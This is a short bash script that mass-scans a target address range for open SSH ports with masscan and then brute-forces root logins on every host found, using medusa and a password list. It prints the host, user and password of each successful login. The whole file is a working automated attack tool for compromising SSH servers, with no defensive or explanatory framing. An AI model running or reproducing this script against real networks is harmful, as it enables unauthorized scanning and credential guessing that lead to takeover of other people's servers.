#!/usr/bin/bash

target=$1;
ipfile=${target:0:5}.txt

masscan $target -p 22 --rate 4000 --wait 2 > output.txt

wait

cat output.txt | awk '{print $6}' > $ipfile

wait

medusa -H ${ipfile} -u root -P pass.txt -M ssh -T 45 -f -r 0 -O success-${ipfile}

wait

cat success-${ipfile} | awk '{print $5" "$7" "$9}'